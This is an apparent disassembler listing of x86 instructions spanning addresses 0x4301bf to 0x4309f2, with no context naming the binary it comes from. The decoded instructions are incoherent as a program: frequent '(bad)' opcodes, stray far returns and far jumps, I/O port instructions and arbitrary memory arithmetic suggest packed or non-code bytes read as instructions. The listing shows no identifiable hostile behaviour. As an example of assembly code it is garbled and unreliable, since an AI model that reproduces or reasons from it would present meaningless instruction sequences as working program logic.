  4301bf:	(bad)  
  4301c0:	out    dx,al
  4301c1:	(bad)  
  4301c2:	fisttp WORD PTR [eax+0x8801c7]
  4301c8:	jecxz  0x43020f
  4301ca:	in     al,dx
  4301cb:	inc    DWORD PTR [ebp-0x4]
  4301ce:	out    0x8d,eax
  4301d0:	aas    
  4301d1:	inc    edi
  4301d3:	jmp    FWORD PTR [eax-0x78]
  4301d6:	inc    DWORD PTR [ecx]
  4301d8:	mov    DWORD PTR [eax],0xc7043d
  4301de:	ins    BYTE PTR es:[edi],dx
  4301df:	test   edi,edi
  4301e1:	pandn  mm0,mm5
  4301e4:	aas    
  4301e5:	add    bh,al
  4301e7:	mov    esi,DWORD PTR [eax-0x4]
  4301ea:	inc    DWORD PTR [eax+0xdf01ee]
  4301f0:	(bad)  
  4301f1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4301f5:	mov    ebp,ebx
  4301f7:	xchg   esp,eax
  4301f8:	fild   DWORD PTR [eax]
  4301fa:	(bad)  
  4301fb:	mov    edi,DWORD PTR [eax+0x3]
  4301fe:	(bad)  
  4301ff:	cmp    al,0xe7
  430201:	dec    ebp
  430202:	leave  
  430203:	mov    ebp,eax
  430205:	fsubr  DWORD PTR [edx]
  430207:	add    BYTE PTR [eax],al
  430209:	lea    ecx,[ebx-0x7f0003b4]
  43020f:	push   edx
  430210:	add    DWORD PTR [ebp+0x0],edx
  430213:	mov    esi,DWORD PTR [eax]
  430215:	mov    WORD PTR [edi],ss
  430217:	add    BYTE PTR [eax],al
  430219:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43021f:	add    ah,bh
  430221:	push   0x7d
  430223:	dec    DWORD PTR [ebx+0xd88c]
  430229:	push   edx
  43022a:	mov    edx,DWORD PTR [ecx-0x4]
  43022d:	call   DWORD PTR [eax+0x7d01fc]
  430233:	mov    esi,DWORD PTR [esi]
  430235:	cld    
  430236:	add    BYTE PTR [eax+0x560150],dl
  43023c:	test   DWORD PTR [ebp+0x75],eax
  43023f:	loop   0x4301cc
  430241:	jmp    0xe38b:0x947dc7fc
  430248:	fsub   st,st(7)
  43024a:	add    bh,al
  43024c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  430252:	add    edi,edi
  430254:	add    bh,bh
  430256:	adc    al,0xed
  430258:	add    dh,ah
  43025a:	push   eax
  43025b:	inc    ebp
  43025c:	push   esi
  43025d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  430263:	test   BYTE PTR [ebx],dh
  430265:	out    0x5,al
  430267:	shl    BYTE PTR [edx+0x45],0x0
  43026b:	jmp    0x43022e
  43026d:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  430274:	inc    esi
  430275:	jle    0x430277
  430277:	test   edi,eax
  430279:	(bad)  
  43027a:	call   0x130037e
  43027f:	out    0x75,al
  430281:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430287:	in     al,dx
  430288:	mov    esp,edx
  43028a:	mov    ah,0x85
  43028c:	add    bh,bh
  43028e:	call   0x1292c92
  430293:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43029a:	add    ebx,esp
  43029c:	add    ah,ch
  43029e:	xor    BYTE PTR [ebp-0xff0073],al
  4302a4:	mov    ebx,ebp
  4302a6:	cld    
  4302a7:	jle    0x430232
  4302a9:	add    DWORD PTR gs:[eax],eax
  4302ac:	add    BYTE PTR [eax+0x1],dl
  4302af:	inc    ebp
  4302b0:	inc    ebp
  4302b1:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  4302b7:	dec    DWORD PTR [ebx-0x3fd80318]
  4302bd:	add    BYTE PTR [ebp-0xbf0040],dl
  4302c3:	inc    ebp
  4302c4:	fmul   QWORD PTR [ebx-0x4faf0400]
  4302ca:	inc    ebp
  4302cb:	add    DWORD PTR [ebx+0x459c00],ecx
  4302d1:	mov    edi,edi
  4302d3:	mov    eax,0xe80800ff
  4302d8:	inc    ebp
  4302d9:	sub    cl,BYTE PTR [ebx-0x47000400]
  4302df:	add    al,0x1
  4302e1:	rol    BYTE PTR [eax],0x1e
  4302e4:	jne    0x43032b
  4302e6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4302ec:	inc    DWORD PTR [ecx]
  4302ee:	call   0x882bf3
  4302f3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4302f9:	call   0x432cff
  4302fe:	xor    bh,bh
  430300:	push   edi
  430301:	adc    BYTE PTR [ebx-0x74741bbb],al
  430307:	fsub   st,st(4)
  430309:	ret    
  43030a:	loopne 0x4302a7
  43030c:	xor    DWORD PTR [edx],0x31
  43030f:	cmp    edi,edi
  430311:	bswap  eax
  430313:	rol    BYTE PTR gs:[eax],0x5
  430317:	jmp    0x12e0461
  43031c:	mov    eax,DWORD PTR [ebp-0x4]
  43031f:	add    BYTE PTR [eax+0xff0100],bh
  430325:	cld    
  430326:	jne    0x4303a5
  430328:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  43032e:	jb     0x430331
  430330:	add    BYTE PTR [eax],al
  430332:	push   eax
  430333:	fild   DWORD PTR [ebp+0x0]
  430336:	mov    edx,DWORD PTR [eax-0x68]
  430339:	inc    ebp
  43033a:	add    BYTE PTR [ebx+0xffa8ff],cl
  430340:	or     bh,bh
  430342:	inc    ebp
  430343:	call   0x1272a47
  430348:	jge    0x430397
  43034a:	adc    BYTE PTR [ebx+0x459cb9],cl
  430350:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  430356:	fwait
  430357:	mov    eax,0x30132
  43035c:	lea    esi,[ebp+0x2c]
  43035f:	xor    edi,edi
  430361:	(bad)  
  430362:	call   0x1422ccf
  430367:	call   0x1372cf7
  43036c:	jne    0x4302f9
  43036e:	xor    edi,esp
  430370:	add    eax,DWORD PTR [eax+0xc018d]
  430376:	push   DWORD PTR [eax]
  430378:	call   0xcc2cd4
  43037d:	enter  0x45ff,0xe0
  430381:	mov    ecx,DWORD PTR [ebp-0x28]
  430384:	xor    eax,DWORD PTR [eax]
  430386:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43038c:	(bad)  
  43038d:	xchg   ebp,eax
  43038e:	call   0x1420492
  430393:	mov    cl,0x45
  430395:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43039b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  4303a2:	mov    edi,edi
  4303a4:	or     BYTE PTR [eax],cl
  4303a6:	inc    ebp
  4303a7:	test   DWORD PTR gs:[eax],eax
  4303aa:	je     0x4303f1
  4303ac:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  4303b2:	xor    edx,DWORD PTR [eax-0x73]
  4303b5:	push   ebp
  4303b6:	or     BYTE PTR [ebp+0x21007572],al
  4303bc:	inc    ebp
  4303bd:	loopne 0x43034a
  4303bf:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  4303c6:	int    0x0
  4303c8:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  4303ce:	inc    ebp
  4303cf:	push   ebp
  4303d0:	cmp    ebp,eax
  4303d2:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  4303d9:	cld    
  4303da:	fadd   QWORD PTR [eax+0x3b014d]
  4303e0:	jne    0x430412
  4303e2:	push   0xf8898557
  4303e7:	loopne 0x43045e
  4303e9:	inc    ebp
  4303ea:	lea    eax,[ebx+0x72e8e4cc]
  4303f0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4303f6:	jmp    0x43042b
  4303f8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4303fe:	xor    eax,edi
  430400:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43040a:	rcl    BYTE PTR [eax-0x40],1
  43040d:	inc    ebp
  43040e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430416:	inc    ebp
  430417:	xchg   ebp,eax
  430418:	ud0    ebp,DWORD PTR [ebx]
  43041b:	inc    DWORD PTR [eax]
  43041d:	daa    
  43041e:	jbe    0x430420
  430420:	mov    dl,BYTE PTR [eax-0x80]
  430423:	push   ebp
  430424:	pop    ds
  430425:	mov    ecx,DWORD PTR [esp+esi*8]
  430428:	inc    eax
  430429:	retf   
  43042a:	inc    ebp
  43042b:	iret   
  43042c:	jb     0x4303f6
  43042e:	mov    eax,DWORD PTR [edi]
  430430:	int3   
  430431:	inc    ebp
  430432:	inc    ebp
  430433:	add    DWORD PTR [ecx],esi
  430435:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  43043c:	xor    dh,BYTE PTR [ebx]
  43043e:	pushf  
  43043f:	lea    ecx,[ecx+0x4d72d808]
  430445:	add    BYTE PTR [ebx],dh
  430447:	inc    ebp
  430448:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  43044e:	xor    dl,BYTE PTR [edx]
  430450:	add    eax,DWORD PTR [ebp-0x77]
  430453:	mov    eax,esp
  430455:	fmul   QWORD PTR [ebp-0x3d]
  430458:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  43045f:	mov    DWORD PTR [ebp-0x24],eax
  430462:	rol    DWORD PTR [ebp-0x64],1
  430465:	xor    eax,edi
  430467:	mov    ecx,0xff858db0
  43046c:	clc    
  43046d:	enter  0x4d45,0x3c
  430471:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  430478:	test   esi,edi
  43047a:	clc    
  43047b:	inc    DWORD PTR [ebp+0x45]
  43047e:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430486:	test   DWORD PTR [ecx],esi
  430488:	clc    
  430489:	pushf  
  43048a:	inc    ebp
  43048b:	(bad)  
  43048c:	cmp    ah,bh
  43048e:	pushf  
  43048f:	inc    ebp
  430490:	mov    edx,DWORD PTR [eax-0x24]
  430493:	add    BYTE PTR [ebp+0x0],dl
  430496:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43049c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  4304a0:	add    al,dl
  4304a2:	jmp    0x1040672
  4304a7:	jb     0x4304f6
  4304a9:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  4304af:	xor    ecx,DWORD PTR [ebp+0x3b]
  4304b2:	xor    ecx,DWORD PTR [edi]
  4304b4:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  4304b8:	(bad)  
  4304ba:	clc    
  4304bb:	int3   
  4304bc:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  4304c3:	push   cs
  4304c4:	xor    ecx,eax
  4304c6:	xor    esp,ecx
  4304c8:	add    ebp,DWORD PTR [eax]
  4304ca:	add    esi,DWORD PTR [eax]
  4304cc:	(bad)  
  4304ce:	retf   0x55cc
  4304d1:	repnz mov eax,DWORD PTR [ebp-0x10]
  4304d5:	(bad)  
  4304d6:	cli    
  4304d7:	fdiv   st(1),st
  4304d9:	test   DWORD PTR [eax+edi*8],ecx
  4304dc:	dec    ebp
  4304dd:	inc    ebp
  4304de:	xor    edi,DWORD PTR [eax-0x7167afd]
  4304e4:	add    BYTE PTR [ebp+0x0],al
  4304e7:	mov    ecx,DWORD PTR [ebp-0x24]
  4304ea:	mov    ecx,ebx
  4304ec:	clc    
  4304ed:	jne    0x4304ba
  4304ef:	mov    esi,0xd672d3
  4304f4:	into   
  4304f5:	into   
  4304f6:	scas   eax,DWORD PTR es:[edi]
  4304f7:	dec    ebp
  4304f8:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  4304fe:	sub    ecx,esi
  430500:	cmp    ecx,DWORD PTR [ebp+0x77]
  430503:	(bad)  
  430504:	mov    edi,eax
  430506:	mov    al,0x85
  430508:	mov    eax,edi
  43050a:	add    BYTE PTR [ebp-0x75],al
  43050d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430514:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43051a:	(bad)  
  43051c:	retf   0x559c
  43051f:	(bad)  
  430520:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  430527:	inc    ebp
  430528:	add    eax,0xeb9c4d3f
  43052d:	(bad)  
  43052e:	mov    ecx,eax
  430530:	lods   al,BYTE PTR ds:[esi]
  430531:	test   DWORD PTR [ebp-0x8],edx
  430534:	xor    ecx,DWORD PTR [ebp+0x33]
  430537:	mov    eax,DWORD PTR [ebx]
  430539:	lock add ecx,ebx
  43053c:	bswap  esi
  43053e:	retf   0x55d1
  430541:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  430547:	jmp    0x430542
  430549:	add    BYTE PTR ds:0xebc44d8b,al
  43054f:	push   ebp
  430550:	mov    ebp,DWORD PTR [ebx]
  430552:	test   al,0x8b
  430554:	push   ebp
  430555:	clc    
  430556:	xor    ecx,ebx
  430558:	xor    ecx,esi
  43055a:	add    edx,ecx
  43055c:	add    eax,DWORD PTR [edx+0xca010f]
  430562:	push   ebp
  430563:	dec    ebp
  430564:	mov    ecx,DWORD PTR [ebx-0x34050710]
  43056a:	stc    
  43056b:	rol    DWORD PTR ds:0xebce4dd6,cl
  430571:	scas   eax,DWORD PTR es:[edi]
  430572:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  430578:	xor    ebp,DWORD PTR [ebx]
  43057a:	xor    edi,DWORD PTR [ebx]
  43057c:	add    esi,DWORD PTR [edi+0x3]
  43057f:	mov    ecx,DWORD PTR [edi]
  430581:	clc    
  430582:	retf   0x55cb
  430585:	into   
  430586:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43058d:	mov    eax,0x3376554d
  430592:	mov    esi,DWORD PTR [ebx]
  430594:	enter  0x5503,0x3
  430598:	xor    ecx,DWORD PTR [edi]
  43059a:	xor    ecx,edx
  43059c:	add    edx,DWORD PTR [ebp+0x3]
  43059f:	mov    ecx,DWORD PTR [edi]
  4305a1:	lock retf 0x4dfa
  4305a5:	stc    
  4305a6:	mov    ecx,DWORD PTR [eax]
  4305a8:	or     BYTE PTR [ebp+0x4d],cl
  4305ab:	jmp    0x107063b
  4305b0:	dec    ebp
  4305b1:	dec    ebp
  4305b2:	(bad)  
  4305b3:	mov    esp,esp
  4305b5:	clc    
  4305b6:	test   ebx,ecx
  4305b8:	clc    
  4305b9:	ror    DWORD PTR [ebp-0x2a],cl
  4305bc:	mov    esi,ecx
  4305be:	in     al,dx
  4305bf:	scas   eax,DWORD PTR es:[edi]
  4305c0:	inc    ebp
  4305c1:	mov    esi,DWORD PTR [ebx]
  4305c3:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  4305ca:	retf   
  4305cb:	ja     0x43059b
  4305cd:	mov    ebp,DWORD PTR [eax-0x48]
  4305d0:	dec    ebp
  4305d1:	xor    ecx,DWORD PTR [di+0x3]
  4305d5:	mov    ebp,eax
  4305d7:	clc    
  4305d8:	push   ebp
  4305d9:	retf   
  4305da:	mov    dl,bl
  4305dc:	adc    esi,edx
  4305de:	jb     0x4305ae
  4305e0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4305e6:	in     al,dx
  4305e7:	jge    0x4305b4
  4305e9:	sub    ecx,DWORD PTR [ebp+0x3b]
  4305ec:	mov    esi,DWORD PTR [edi-0x24]
  4305ef:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  4305f6:	mov    BYTE PTR [ebx-0x34b20729],cl
  4305fc:	mov    edx,ebx
  4305fe:	in     al,dx
  4305ff:	(bad)  
  430600:	ror    esi,cl
  430602:	push   ebp
  430603:	scas   eax,DWORD PTR es:[edi]
  430604:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43060a:	fwait
  43060b:	sub    esi,DWORD PTR [edx]
  43060d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430613:	lods   al,BYTE PTR ds:[esi]
  430614:	xor    esp,DWORD PTR [ebx]
  430616:	add    ecx,DWORD PTR [ebp-0x18]
  430619:	mov    edi,DWORD PTR [ebp-0x8]
  43061c:	mov    bl,cl
  43061e:	cmp    dl,bl
  430620:	jb     0x4305f0
  430622:	add    dh,dl
  430624:	dec    ebp
  430625:	scas   eax,DWORD PTR es:[edi]
  430626:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  43062c:	shr    DWORD PTR [ebx],cl
  43062e:	into   
  43062f:	cmp    edx,esi
  430631:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  430637:	dec    ebp
  430638:	dec    ebp
  430639:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  43063f:	retf   
  430640:	xor    edx,esi
  430642:	add    ecx,esi
  430644:	imul   ecx,edx
  430647:	mov    DWORD PTR [ebp+0x8],edx
  43064a:	xor    ecx,DWORD PTR [ebp+0x2b]
  43064d:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  430653:	add    esi,DWORD PTR [ebx]
  430655:	mov    ah,0x3
  430657:	inc    ebp
  430658:	rdtsc  
  43065a:	xlat   BYTE PTR ds:[ebx]
  43065b:	pushf  
  43065c:	jge    0x4305e7
  43065e:	xor    ebx,esp
  430660:	sub    eax,DWORD PTR [ebp-0x73]
  430663:	(bad)  
  430664:	cmp    al,al
  430666:	jb     0x4305ed
  430668:	add    al,bh
  43066a:	ror    DWORD PTR [ebp-0x7a],1
  43066d:	xor    edi,edi
  43066f:	add    edi,edi
  430671:	jmp    0x4306c0
  430673:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430679:	dec    ebp
  43067a:	into   
  43067b:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430681:	fwait
  430682:	shl    DWORD PTR [edx],cl
  430684:	retf   0x5588
  430687:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43068d:	add    eax,DWORD PTR [eax]
  43068f:	call   0x8ace5be1
  430694:	fcom   DWORD PTR [ecx]
  430696:	retf   
  430697:	jb     0x4306fe
  430699:	add    ch,cl
  43069b:	dec    ebp
  43069c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  4306a2:	dec    ebp
  4306a3:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  4306a9:	jge    0x430679
  4306ab:	mov    BYTE PTR [edi+0xf723b3a],ch
  4306b1:	add    cl,dh
  4306b3:	dec    ebp
  4306b4:	dec    DWORD PTR [ebx-0x2c031b75]
  4306ba:	adc    BYTE PTR [ebp+0x1],0x8b
  4306be:	add    ah,bl
  4306c0:	jge    0x43064e
  4306c2:	push   0xffffff9b
  4306c4:	push   0x8b3032
  4306c9:	shl    BYTE PTR [ebp+0x55],0x6a
  4306cd:	xor    edi,edi
  4306cf:	xor    edx,DWORD PTR [ebx+eax*1]
  4306d2:	inc    ebp
  4306d3:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4306d9:	dec    ebp
  4306da:	or     BYTE PTR [ecx+0x4dcce883],cl
  4306e0:	jbe    0x43066d
  4306e2:	mov    esp,eax
  4306e4:	ror    bl,1
  4306e6:	enter  0x14ce,0xaf
  4306ea:	dec    DWORD PTR [ebx-0x2cef13f8]
  4306f0:	push   ebp
  4306f1:	retf   0x5540
  4306f4:	push   ebp
  4306f5:	mov    esi,DWORD PTR [edx-0x18]
  4306f8:	mov    edx,ebx
  4306fa:	cld    
  4306fb:	(bad)  
  4306fc:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430703:	sti    
  430704:	add    dh,cl
  430706:	push   0xffffff94
  430708:	call   FWORD PTR [ebx+0x3b5032d0]
  43070e:	mov    ecx,DWORD PTR [edi]
  430710:	enter  0x455e,0xff
  430714:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43071a:	xor    esi,DWORD PTR [ebx]
  43071c:	mov    DWORD PTR [ebx],0xcace0f9c
  430722:	aas    
  430723:	push   ebp
  430724:	inc    ebp
  430725:	xor    edx,esi
  430727:	add    edx,esi
  430729:	mov    eax,DWORD PTR [ebx]
  43072b:	(bad)  
  43072c:	jmp    0x4306ba
  43072e:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  430734:	rol    ah,1
  430736:	mov    esi,0xf133104d
  43073b:	mov    edx,0xff388d80
  430740:	mov    dh,0xd1
  430742:	cmp    edx,DWORD PTR [ebp+0xf]
  430745:	mov    eax,DWORD PTR [edx-0x28]
  430748:	add    BYTE PTR [ebp-0x75],bh
  43074b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  430752:	fwait
  430753:	retf   0x8632
  430756:	cmp    ebp,0x8
  430759:	call   ebx
  43075b:	inc    ebp
  43075c:	inc    ebp
  43075d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  430763:	mov    esi,DWORD PTR [ecx]
  430765:	int3   
  430766:	pushf  
  430767:	add    al,0xc7
  430769:	add    al,al
  43076b:	add    bl,al
  43076d:	(bad)  
  43076e:	clc    
  43076f:	int3   
  430770:	inc    ebp
  430771:	add    BYTE PTR [ecx],dh
  430773:	push   eax
  430774:	pushf  
  430775:	mov    edi,eax
  430777:	enter  0xc008,0x85
  43077b:	aas    
  43077c:	clc    
  43077d:	gs inc ebp
  43077f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430785:	push   ss
  430786:	xor    ecx,DWORD PTR [ebp+0x3]
  430789:	sub    edx,DWORD PTR [ecx-0x76]
  43078c:	dec    ebp
  43078d:	add    DWORD PTR [ebx+0x88d845],ecx
  430793:	mov    esi,DWORD PTR [ebx]
  430795:	or     BYTE PTR [ebx],al
  430797:	cmp    edx,DWORD PTR [ecx-0x34]
  43079a:	dec    ebp
  43079b:	out    dx,eax
  43079c:	xor    eax,DWORD PTR [ebp+0x3]
  43079f:	mov    edx,DWORD PTR [ecx-0x28]
  4307a2:	dec    ebp
  4307a3:	add    BYTE PTR [ebx],dh
  4307a5:	push   0x518003
  4307aa:	push   eax
  4307ab:	add    BYTE PTR [ebx-0x300748b],cl
  4307b1:	sbb    BYTE PTR [ebp+0x45],cl
  4307b4:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  4307ba:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4307c0:	dec    ebp
  4307c1:	inc    ebp
  4307c2:	xor    edx,esi
  4307c4:	add    edx,esi
  4307c6:	push   ecx
  4307c7:	(bad)  
  4307c8:	dec    ebp
  4307c9:	mov    al,ds:0xc5d83dff
  4307ce:	retf   
  4307cf:	(bad)  
  4307d0:	into   
  4307d1:	sub    bh,bh
  4307d3:	dec    esp
  4307d4:	adc    al,0x9c
  4307d6:	inc    ebp
  4307d7:	push   ebp
  4307d8:	test   DWORD PTR [edi],ecx
  4307da:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  4307e1:	jmp    0xc9bc16f5
  4307e6:	add    cl,dl
  4307e8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4307f2:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4307f8:	rol    BYTE PTR [eax],0x54
  4307fb:	clc    
  4307fc:	gs jb  0x430806
  4307ff:	mov    eax,DWORD PTR [ebp-0x30]
  430802:	xor    al,0x40
  430804:	sub    al,0xc7
  430806:	mov    al,ah
  430808:	add    DWORD PTR [ebp+0x4534f845],eax
  43080e:	sub    al,0x80
  430810:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430817:	mov    ch,0xff
  430819:	clc    
  43081a:	add    DWORD PTR [ebp+0x60],0x3d
  43081e:	call   FWORD PTR [eax+eax*1-0x277a77]
  430825:	inc    ebp
  430826:	dec    DWORD PTR [ebx-0x3427f701]
  43082c:	test   esi,ecx
  43082e:	dec    DWORD PTR [ebx-0x7f8a3701]
  430834:	push   eax
  430835:	add    DWORD PTR [ebp+0x0],eax
  430838:	dec    ebx
  43083a:	or     al,0xce
  43083c:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  430843:	into   
  430844:	add    BYTE PTR [ebx-0x34ff2000],cl
  43084a:	mov    esi,ecx
  43084c:	sar    bh,0x45
  43084f:	adc    al,0x8b
  430851:	clc    
  430852:	fadd   DWORD PTR [ebp+0x0]
  430855:	mov    ebp,DWORD PTR [edx+0x8]
  430858:	push   edi
  430859:	adc    BYTE PTR [eax+0x1],0x83
  43085d:	add    al,al
  43085f:	retf   
  430860:	mov    ecx,esi
  430862:	cld    
  430863:	mov    eax,DWORD PTR [eax+0xcb01c8]
  430869:	into   
  43086a:	add    BYTE PTR [ebx+0x756ae000],cl
  430870:	jne    0x4308a5
  430872:	inc    DWORD PTR [ebx]
  430874:	rcl    BYTE PTR [ecx+0x50],1
  430877:	push   eax
  430878:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  43087e:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430885:	sar    bh,0x84
  430888:	or     BYTE PTR [ebx],al
  43088a:	push   eax
  43088b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430891:	pushf  
  430892:	xor    edi,eax
  430894:	pushf  
  430895:	mov    ah,0x89
  430897:	test   esp,ebp
  430899:	clc    
  43089a:	inc    ebp
  43089b:	inc    ebp
  43089c:	mov    DWORD PTR [eax+eax*8],esi
  43089f:	sub    al,0x32
  4308a1:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  4308a8:	dec    ebp
  4308a9:	xor    eax,DWORD PTR gs:[edi+0x3]
  4308ad:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  4308b3:	xor    eax,DWORD PTR gs:[edi+0x3]
  4308b7:	or     DWORD PTR [ecx+0x45ff085c],0x0
  4308be:	shl    DWORD PTR [ebp-0x380064],1
  4308c4:	enter  0x858d,0x60
  4308c8:	clc    
  4308c9:	inc    DWORD PTR [ebp+0x50]
  4308cc:	cmp    al,0x75
  4308ce:	pushf  
  4308cf:	(bad)  
  4308d0:	(bad)  
  4308d1:	pop    esp
  4308d2:	lods   al,BYTE PTR ds:[esi]
  4308d3:	inc    DWORD PTR [ebp+0x4508f8ff]
  4308d9:	mov    edi,DWORD PTR [esi]
  4308db:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  4308e2:	test   DWORD PTR [edi-0x8],edx
  4308e5:	sbb    al,0x45
  4308e7:	add    BYTE PTR [eax],bh
  4308e9:	push   0x8b809c
  4308ee:	loopne 0x430935
  4308f0:	push   ebp
  4308f1:	mov    esi,DWORD PTR [ebx]
  4308f3:	cld    
  4308f4:	add    eax,DWORD PTR [eax+0xf013b]
  4308fa:	adc    al,0x0
  4308fc:	add    bh,bh
  4308fe:	jmp    0xc00a1b
  430903:	add    BYTE PTR [ebp+0x45],cl
  430906:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  43090c:	dec    ebp
  43090d:	push   0x38033
  430912:	cmp    eax,DWORD PTR [eax]
  430914:	unpcklps xmm7,xmm0
  430917:	jne    0x430919
  430919:	dec    DWORD PTR [ebx+0x5545c818]
  43091f:	mov    DWORD PTR [ebx],esi
  430921:	shl    BYTE PTR [ebx],1
  430923:	inc    ebp
  430924:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  43092a:	retf   0x5575
  43092d:	dec    DWORD PTR [ebx-0x5ba13e8]
  430933:	(bad)  
  430934:	stc    
  430935:	loopne 0x430943
  430937:	test   DWORD PTR [ebp-0x8],ecx
  43093a:	xor    eax,DWORD PTR [ebp+0x3]
  43093d:	mov    ebp,ecx
  43093f:	rol    BYTE PTR [eax],1
  430941:	inc    ebp
  430942:	add    BYTE PTR [eax-0x7747ab3],bh
  430948:	clc    
  430949:	inc    ebp
  43094a:	retf   
  43094b:	mov    edx,ebx
  43094d:	loopne 0x430925
  43094f:	retf   
  430950:	into   
  430951:	into   
  430952:	scas   eax,DWORD PTR es:[edi]
  430953:	dec    ebp
  430954:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  43095a:	sub    ecx,esi
  43095c:	cmp    ecx,DWORD PTR [ebp+0x77]
  43095f:	(bad)  
  430960:	mov    edi,eax
  430962:	enter  0x8985,0xf8
  430966:	add    BYTE PTR [ebp-0x75],al
  430969:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  430970:	xor    eax,DWORD PTR [ebp+0x4503f803]
  430976:	(bad)  
  430978:	retf   0x559c
  43097b:	(bad)  
  43097c:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430983:	inc    ebp
  430984:	add    eax,0xeb9c4d3f
  430989:	(bad)  
  43098a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430990:	xor    ecx,DWORD PTR [ebp+0x33]
  430993:	mov    eax,DWORD PTR [ebx]
  430995:	in     al,dx
  430996:	add    ecx,ebx
  430998:	bswap  esi
  43099a:	retf   0x55d1
  43099d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  4309a3:	jmp    0x43099e
  4309a5:	add    BYTE PTR ds:0xebf44d8b,al
  4309ab:	push   ebp
  4309ac:	mov    ebp,DWORD PTR [ebx]
  4309ae:	mov    eax,0x33f8558b
  4309b3:	retf   
  4309b4:	xor    ecx,esi
  4309b6:	add    edx,ecx
  4309b8:	add    eax,DWORD PTR [edx+0xca010f]
  4309be:	push   ebp
  4309bf:	dec    ebp
  4309c0:	mov    ecx,DWORD PTR [ebx-0x34050714]
  4309c6:	stc    
  4309c7:	rol    DWORD PTR ds:0xebce4dd6,cl
  4309cd:	scas   eax,DWORD PTR es:[edi]
  4309ce:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  4309d4:	xor    ebp,DWORD PTR [ebx]
  4309d6:	xor    edi,DWORD PTR [ebx]
  4309d8:	add    esi,DWORD PTR [edi+0x3]
  4309db:	mov    ecx,DWORD PTR [edi]
  4309dd:	clc    
  4309de:	retf   0x55cb
  4309e1:	into   
  4309e2:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  4309e9:	test   al,0x4d
  4309eb:	push   ebp
  4309ec:	jbe    0x430a21
  4309ee:	mov    esi,DWORD PTR [ebx]
  4309f0:	mov    al,0x3
  4309f2:	push   ebp
